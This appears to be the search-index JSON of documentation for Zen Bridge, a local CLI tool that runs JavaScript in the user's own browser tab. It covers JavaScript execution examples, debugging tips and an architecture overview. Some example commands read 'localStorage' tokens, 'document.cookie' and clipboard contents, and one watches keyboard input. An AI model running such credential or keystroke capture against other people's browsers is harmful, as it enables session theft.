price: p.querySelector('.price').textContent\n    };\n  });\n\"\n</code></pre></p> <p>Use document fragments: <pre><code>zen eval \"\n  const fragment = document.createDocumentFragment();\n  for (let i = 0; i &lt; 100; i++) {\n    const div = document.createElement('div');\n    div.textContent = i;\n    fragment.appendChild(div);\n  }\n  document.body.appendChild(fragment);\n  return 'Added 100 divs efficiently';\n\"\n</code></pre></p>"},{"location":"guide/javascript-execution/#data-transformation","title":"Data Transformation","text":"<p>CSV Generation: <pre><code>zen eval \"\n  const rows = Array.from(document.querySelectorAll('table tr'));\n  return rows.map(row =&gt;\n    Array.from(row.cells).map(cell =&gt; cell.textContent).join(',')\n  ).join('\\n');\n\" --format raw &gt; data.csv\n</code></pre></p> <p>JSON Transformation: <pre><code>zen eval \"\n  const links = Array.from(document.links);\n  return links.reduce((acc, link) =&gt; {\n    acc[link.textContent] = link.href;\n    return acc;\n  }, {});\n\" --format json\n</code></pre></p>"},{"location":"guide/javascript-execution/#state-management","title":"State Management","text":"<p>Store data globally: <pre><code># Set\nzen eval \"window.zenData = {extracted: Date.now(), items: [1,2,3]}\"\n\n# Get\nzen eval \"window.zenData\"\n\n# Update\nzen eval \"window.zenData.items.push(4); window.zenData\"\n</code></pre></p>"},{"location":"guide/javascript-execution/#console-integration","title":"Console Integration","text":"<pre><code># Log to browser console\nzen eval \"console.log('Debug:', document.title); document.title\"\n\n# Console table\nzen eval \"\n  const data = Array.from(document.links).slice(0, 5).map(a =&gt; ({\n    text: a.textContent,\n    href: a.href\n  }));\n  console.table(data);\n  return data.length;\n\"\n\n# Console time\nzen eval \"\n  console.time('query');\n  const result = document.querySelectorAll('*').length;\n  console.timeEnd('query');\n  return result;\n\"\n</code></pre>"},{"location":"guide/javascript-execution/#browser-apis","title":"Browser APIs","text":"<p>Local Storage: <pre><code>zen eval \"localStorage.getItem('token')\"\nzen eval \"localStorage.setItem('key', 'value')\"\nzen eval \"Object.keys(localStorage)\"\n</code></pre></p> <p>Cookies: <pre><code>zen eval \"document.cookie\"\nzen eval \"document.cookie.split(';').length\"\n</code></pre></p> <p>Performance API: <pre><code>zen eval \"performance.now()\"\nzen eval \"performance.memory.usedJSHeapSize\"\nzen eval \"performance.timing.loadEventEnd - performance.timing.navigationStart\"\n</code></pre></p> <p>Clipboard API: <pre><code>zen eval \"await navigator.clipboard.readText()\"\nzen eval \"await navigator.clipboard.writeText('Hello from CLI')\"\n</code></pre></p>"},{"location":"guide/javascript-execution/#best-practices","title":"Best Practices","text":""},{"location":"guide/javascript-execution/#1-return-structured-data","title":"1. Return Structured Data","text":"<pre><code># Good - structured return\nzen eval \"\n  return {\n    success: true,\n    count: document.links.length,\n    timestamp: Date.now()\n  };\n\"\n\n# Avoid - multiple console.logs\nzen eval \"\n  console.log('Links:', document.links.length);\n  console.log('Images:', document.images.length);\n\"\n</code></pre>"},{"location":"guide/javascript-execution/#2-use-meaningful-variable-names","title":"2. Use Meaningful Variable Names","text":"<pre><code># Good\nzen eval \"\n  const productElements = document.querySelectorAll('.product');\n  const productData = Array.from(productElements).map(extractProductInfo);\n  return productData;\n\"\n\n# Avoid\nzen eval \"\n  const a = document.querySelectorAll('.product');\n  const b = Array.from(a).map(c =&gt; extractProductInfo(c));\n  return b;\n\"\n</code></pre>"},{"location":"guide/javascript-execution/#3-handle-edge-cases","title":"3. Handle Edge Cases","text":"<pre><code>zen eval \"\n  const element = document.querySelector('.may-not-exist');\n  if (!element) {\n    return { error: 'Element not found' };\n  }\n  return { text: element.textContent };\n\"\n</code></pre>"},{"location":"guide/javascript-execution/#4-comment-complex-code","title":"4. Comment Complex Code","text":"<pre><code>zen eval \"\n  // Extract all external links\n  const allLinks = Array.from(document.querySelectorAll('a'));\n\n  // Filter to external only\n  const externalLinks = allLinks.filter(link =&gt;\n    link.hostname !== location.hostname &amp;&amp; link.hostname !== ''\n  );\n\n  // Return count and sample\n  return {\n    total: externalLinks.length,\n    sample: externalLinks.slice(0, 5).map(l =&gt; l.href)\n  };\n\"\n</code></pre>"},{"location":"guide/javascript-execution/#5-use-functions-for-reusability","title":"5. Use Functions for Reusability","text":"<p>script.js: <pre><code>function extractProductData(selector) {\n  const products = document.querySelectorAll(selector);\n  return Array.from(products).map(product =&gt; ({\n    name: product.querySelector('.name')?.textContent?.trim(),\n    price: product.querySelector('.price')?.textContent?.trim(),\n    available: !product.classList.contains('out-of-stock')\n  })).filter(p =&gt; p.name &amp;&amp; p.price);\n}\n\nreturn extractProductData('.product-item');\n</code></pre></p>"},{"location":"guide/javascript-execution/#debugging-tips","title":"Debugging Tips","text":""},{"location":"guide/javascript-execution/#1-use-browser-devtools","title":"1. Use Browser DevTools","text":"<p>Open browser console while running commands to see: - <code>console.log()</code> output - JavaScript errors with stack traces - Network requests - Performance metrics</p>"},{"location":"guide/javascript-execution/#2-test-in-repl-first","title":"2. Test in REPL First","text":"<pre><code>zen repl\nzen&gt; document.querySelector('.complex-selector')\nzen&gt; Array.from(document.querySelectorAll('.items')).length\nzen&gt; exit\n</code></pre>"},{"location":"guide/javascript-execution/#3-break-down-complex-code","title":"3. Break Down Complex Code","text":"<pre><code># Step 1: Test selector\nzen eval \"document.querySelectorAll('.product').length\"\n\n# Step 2: Test extraction\nzen eval \"document.querySelector('.product .name').textContent\"\n\n# Step 3: Combine\nzen eval \"Array.from(document.querySelectorAll('.product')).map(p =&gt; p.querySelector('.name').textContent)\"\n</code></pre>"},{"location":"guide/javascript-execution/#4-add-debug-output","title":"4. Add Debug Output","text":"<pre><code>zen eval \"\n  console.log('Starting extraction...');\n  const products = document.querySelectorAll('.product');\n  console.log('Found products:', products.length);\n  const data = Array.from(products).map(p =&gt; {\n    const name = p.querySelector('.name')?.textContent;\n    console.log('Extracted:', name);\n    return {name};\n  });\n  console.log('Complete:', data.length);\n  return data;\n\"\n</code></pre>"},{"location":"guide/javascript-execution/#common-pitfalls","title":"Common Pitfalls","text":""},{"location":"guide/javascript-execution/#1-forgetting-to-return","title":"1. Forgetting to Return","text":"<pre><code># Wrong - no return\nzen eval \"\n  const links = document.querySelectorAll('a');\n  links.length;\n\"\n# Output: undefined\n\n# Correct\nzen eval \"\n  const links = document.querySelectorAll('a');\n  return links.length;\n\"\n# Output: 15\n</code></pre>"},{"location":"guide/javascript-execution/#2-async-without-await","title":"2. Async Without Await","text":"<pre><code># Wrong - returns Promise\nzen eval \"fetch('/api/data').then(r =&gt; r.json())\"\n# Output: [object Promise]\n\n# Correct - await the promise\nzen eval \"await fetch('/api/data').then(r =&gt; r.json())\"\n# Output: {data: [...]}\n</code></pre>"},{"location":"guide/javascript-execution/#3-quoting-issues","title":"3. Quoting Issues","text":"<pre><code># Wrong - quote mismatch\nzen eval 'document.querySelector(\"div[data-id=\"123\"]\")'\n\n# Correct - escape or use heredoc\nzen eval \"document.querySelector(\\\"div[data-id='123']\\\")\"\n</code></pre>"},{"location":"guide/javascript-execution/#4-not-checking-null","title":"4. Not Checking Null","text":"<pre><code># Wrong - may throw error\nzen eval \"document.querySelector('.missing').click()\"\n\n# Correct - check first\nzen eval \"document.querySelector('.missing')?.click() ?? 'Element not found'\"\n</code></pre>"},{"location":"guide/javascript-execution/#next-steps","title":"Next Steps","text":"<ul> <li>Element Interaction - Click, inspect, and interact with elements</li> <li>Data Extraction - Extract structured data</li> <li>Advanced Usage - Complex patterns and scripting</li> </ul>"},{"location":"guide/overview/","title":"Overview","text":"<p>Welcome to Zen Bridge - a powerful CLI tool that lets you control your browser from the command line. Execute JavaScript, automate tasks, extract data, and interact with web pages without leaving your terminal.</p>"},{"location":"guide/overview/#what-is-zen-bridge","title":"What is Zen Bridge?","text":"<p>Zen Bridge is a command-line interface that connects your terminal to your web browser through a WebSocket-based architecture. It allows you to:</p> <ul> <li>Execute JavaScript code in your active browser tab</li> <li>Interact with page elements (click, inspect, highlight, wait)</li> <li>Extract data (links, images, tables, metadata)</li> <li>Automate form filling and navigation</li> <li>Debug and test web applications</li> <li>Monitor browser activity in real-time</li> <li>Control your browser entirely from your keyboard</li> </ul> <p>Think of it as a bridge between your terminal and your browser - hence the name.</p>"},{"location":"guide/overview/#how-it-works","title":"How It Works","text":"<p>Zen Bridge uses a three-component architecture:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502             \u2502  HTTP   \u2502              \u2502  WS     \u2502             \u2502\n\u2502  CLI Tool   \u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6\u2502    Server    \u2502\u25c0\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6\u2502   Browser   \u2502\n\u2502  (Terminal) \u2502  8765   \u2502  (Python)    \u2502  8766   \u2502 (Userscript)\u2502\n\u2502             \u2502         \u2502              \u2502         \u2502             \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"guide/overview/#1-cli-tool-your-terminal","title":"1. CLI Tool (Your Terminal)","text":"<p>When you run commands like <code>zen eval \"document.title\"</code>, the CLI tool:</p> <ul> <li>Parses your command and options</li> <li>Formats the JavaScript code</li> <li>Sends an HTTP request to the local server</li> <li>Waits for the response</li> <li>Displays the result</li> </ul>"},{"location":"guide/overview/#2-bridge-server-background-process","title":"2. Bridge Server (Background Process)","text":"<p>The server acts as a message broker:</p> <ul> <li>Listens for HTTP requests from the CLI (port 8765)</li> <li>Maintains WebSocket connections with browser tabs (port 8766)</li> <li>Routes commands to the active browser tab</li> <li>Returns results back to the CLI</li> <li>Runs in the background as a daemon</li> </ul> <p>Start the server with: <pre><code>zen server start --daemon\n</code></pre></p>"},{"location":"guide/overview/#3-browser-userscript-in-your-browser","title":"3. Browser Userscript (In Your Browser)","text":"<p>A lightweight userscript runs in your browser:</p> <ul> <li>Establishes a WebSocket connection to the server</li> <li>Receives JavaScript code from the server</li> <li>Executes the code in the page context</li> <li>Sends results back to the server</li> <li>Works across page navigations</li> </ul> <p>The userscript must be installed in a userscript manager like Violentmonkey or Tampermonkey.</p>"},{"location":"guide/overview/#websocket-communication-explained","title":"WebSocket Communication Explained","text":""},{"location":"guide/overview/#why-websockets","title":"Why WebSockets?","text":"<p>Traditional HTTP polling would be slow and inefficient. WebSockets provide:</p> <ul> <li>Instant communication - No polling delays</li> <li>Bi-directional - Server can push to browser, browser can push to server</li> <li>Persistent connection - One connection serves multiple commands</li> <li>Low overhead - Minimal latency compared to HTTP requests</li> </ul>"},{"location":"guide/overview/#message-flow-example","title":"Message Flow Example","text":"<p>When you run <code>zen eval \"document.title\"</code>:</p> <ol> <li> <p>CLI \u2192 Server (HTTP) <pre><code>POST http://127.0.0.1:8765/execute\n{\n  \"code\": \"document.title\",\n  \"timeout\": 10\n}\n</code></pre></p> </li> <li> <p>Server \u2192 Browser (WebSocket) <pre><code>{\n  \"type\": \"execute\",\n  \"code\": \"document.title\",\n  \"id\": \"req-123\"\n}\n</code></pre></p> </li> <li> <p>Browser executes code and responds (WebSocket) <pre><code>{\n  \"type\": \"response\",\n  \"id\": \"req-123\",\n  \"result\": \"Example Domain\",\n  \"ok\": true\n}\n</code></pre></p> </li> <li> <p>Server \u2192 CLI (HTTP Response) <pre><code>{\n  \"ok\": true,\n  \"result\": \"Example Domain\"\n}\n</code></pre></p> </li> <li> <p>CLI displays output <pre><code>Example Domain\n</code></pre></p> </li> </ol>"},{"location":"guide/overview/#security-considerations","title":"Security Considerations","text":"<p>The WebSocket connection is local only:</p> <ul> <li>Server binds to <code>127.0.0.1</code> (localhost)</li> <li>Not accessible from external networks</li> <li>No authentication needed (local-only access)</li> <li>Userscript only connects to localhost</li> </ul> <p>This means Zen Bridge can only control browsers on your own machine.</p>"},{"location":"guide/overview/#when-to-use-zen-bridge","title":"When to Use Zen Bridge","text":"<p>Zen Bridge is ideal for:</p>"},{"location":"guide/overview/#web-development-debugging","title":"Web Development &amp; Debugging","text":"<ul> <li>Inspect application state (<code>window.myApp</code>, Redux stores)</li> <li>Test JavaScript functions interactively</li> <li>Debug DOM manipulations</li> <li>Monitor performance metrics</li> <li>Inject jQuery or other libraries for testing</li> </ul>"},{"location":"guide/overview/#web-scraping-data-extraction","title":"Web Scraping &amp; Data Extraction","text":"<ul> <li>Extract data from authenticated pages (logged-in dashboards)</li> <li>Scrape tables, lists, and structured data</li> <li>Download files (images, PDFs, videos)</li> <li>Extract metadata (Open Graph, Twitter Cards)</li> <li>Monitor page changes over time</li> </ul>"},{"location":"guide/overview/#browser-automation","title":"Browser Automation","text":"<ul> <li>Fill and submit forms</li> <li>Navigate through multi-page workflows</li> <li>Click buttons and interact with elements</li> <li>Wait for dynamic content to load</li> <li>Automate repetitive tasks</li> </ul>"},{"location":"guide/overview/#accessibility-testing","title":"Accessibility Testing","text":"<ul> <li>Check heading structure (<code>zen outline</code>)</li> <li>Find images without alt text</li> <li>Test keyboard navigation (<code>zen control</code>)</li> <li>Generate page descriptions for screen readers</li> </ul>"},{"location":"guide/overview/#content-analysis","title":"Content Analysis","text":"<ul> <li>Generate AI summaries of articles (<code>zen summarize</code>)</li> <li>Get concise page descriptions (<code>zen describe</code>)</li> <li>Analyze link structures</li> <li>Check SEO metadata</li> </ul>"},{"location":"guide/overview/#shell-scripting-cicd","title":"Shell Scripting &amp; CI/CD","text":"<ul> <li>Integrate browser data into shell scripts</li> <li>Monitor build dashboards</li> <li>Automate visual regression testing</li> <li>Extract data for reports</li> </ul>"},{"location":"guide/overview/#when-not-to-use-zen-bridge","title":"When NOT to Use Zen Bridge","text":"<p>Zen Bridge is not suitable for:</p>"},{"location":"guide/overview/#heavy-automation-at-scale","title":"Heavy Automation at Scale","text":"<ul> <li>Use Playwright or Puppeteer for:</li> <li>Running hundreds of parallel browser instances</li> <li>Server-side rendering testing</li> <li>Complex test suites with retries and parallelization</li> </ul>"},{"location":"guide/overview/#distributedremote-automation","title":"Distributed/Remote Automation","text":"<ul> <li>Zen Bridge only works on localhost</li> <li>For remote browser control, use Playwright, Puppeteer, or Selenium Grid</li> </ul>"},{"location":"guide/overview/#production-monitoring","title":"Production Monitoring","text":"<ul> <li>Don't rely on Zen Bridge for production monitoring</li> <li>Use proper APM tools (Datadog, New Relic, etc.)</li> </ul>"},{"location":"guide/overview/#privacy-sensitive-operations","title":"Privacy-Sensitive Operations","text":"<ul> <li>Zen Bridge has access to everything in your browser</li> <li>Don't use it on pages with sensitive credentials</li> <li>Be careful with commands that extract cookies or local storage</li> </ul>"},{"location":"guide/overview/#key-features","title":"Key Features","text":""},{"location":"guide/overview/#execute-javascript","title":"Execute JavaScript","text":"<p>Run any JavaScript code in your browser:</p> <pre><code>zen eval \"document.title\"\nzen eval \"Array.from(document.links).map(a =&gt; a.href)\"\nzen eval \"({url: location.href, title: document.title})\" --format json\n</code></pre>"},{"location":"guide/overview/#interactive-repl","title":"Interactive REPL","text":"<p>Live JavaScript session:</p> <pre><code>zen repl\nzen&gt; document.querySelectorAll('p').length\n2\nzen&gt; exit\n</code></pre>"},{"location":"guide/overview/#element-interaction","title":"Element Interaction","text":"<p>Click, inspect, highlight, and wait for elements:</p> <pre><code>zen click \"button#submit\"\nzen inspect \"h1\"\nzen highlight \".error\" --color red\nzen wait \".modal\" --visible\n</code></pre>"},{"location":"guide/overview/#data-extraction","title":"Data Extraction","text":"<p>Extract structured data:</p> <pre><code>zen links --only-external\nzen outline\nzen download\nzen info --extended\n</code></pre>"},{"location":"guide/overview/#ai-powered-features","title":"AI-Powered Features","text":"<p>Summarize and describe pages:</p> <pre><code>zen summarize\nzen describe\n</code></pre> <p>Requires mods for AI integration.</p>"},{"location":"guide/overview/#keyboard-control","title":"Keyboard Control","text":"<p>Navigate entirely from your keyboard:</p> <pre><code>zen control\n# Use Tab, Enter, Arrow keys to navigate\n# Press 'q' to quit\n</code></pre>"},{"location":"guide/overview/#real-time-monitoring","title":"Real-Time Monitoring","text":"<p>Watch browser activity:</p> <pre><code>zen watch input  # Monitor keyboard input\nzen watch all    # Monitor all interactions\n</code></pre>"},{"location":"guide/overview/#architecture-benefits","title":"Architecture Benefits","text":"<p>Zen Bridge follows a hexagonal architecture with clear separation of concerns:</p> <ul> <li>Domain Layer - Pure business logic with Pydantic models</li> <li>Adapter Layer - I/O operations (filesystem, WebSocket)</li> <li>Service Layer - Application services and orchestration</li> <li>Application Layer - CLI commands and server</li> </ul> <p>This design ensures:</p> <ul> <li>High testability (97%+ coverage on services)</li> <li>Clear dependencies (no circular imports)</li> <li>Easy extensibility (add new commands/services)</li> <li>Maintainable codebase</li> </ul> <p>See Architecture Guide for technical details.</p>"},{"location":"guide/overview/#getting-started","title":"Getting Started","text":"<p>Ready to try Zen Bridge? Check out these guides:</p> <ol> <li>Basic Commands - Start here for essential commands</li> <li>JavaScript Execution - Master code execution</li> <li>Element Interaction - Click, inspect, and interact</li> <li>Data Extraction - Extract structured data</li> <li>AI Features - AI-powered summarization and descriptions</li> <li>Control Mode - Keyboard-only navigation</li> <li>Advanced Usage - Scripting and best practices</li> </ol>"},{"location":"guide/overview/#next-steps","title":"Next Steps","text":"<ol> <li>Install Zen Bridge and the userscript (see Installation guide)</li> <li>Start the server: <code>zen server start --daemon</code></li> <li>Try basic commands: <code>zen eval \"document.title\"</code></li> <li>Explore the guides above</li> <li>Check out the API Reference for complete documentation</li> </ol>"},{"location":"guide/overview/#getting-help","title":"Getting Help","text":"<ul> <li>Run <code>zen --help</code> to see all commands</li> <li>Run <code>zen &lt;command&gt; --help</code> for command-specific help</li> <li>Check the GitHub Issues for known issues</li> <li>Read the Contributing Guide to contribute</li> </ul> <p>Welcome to Zen Bridge - control your browser from the command line!</p>"}]}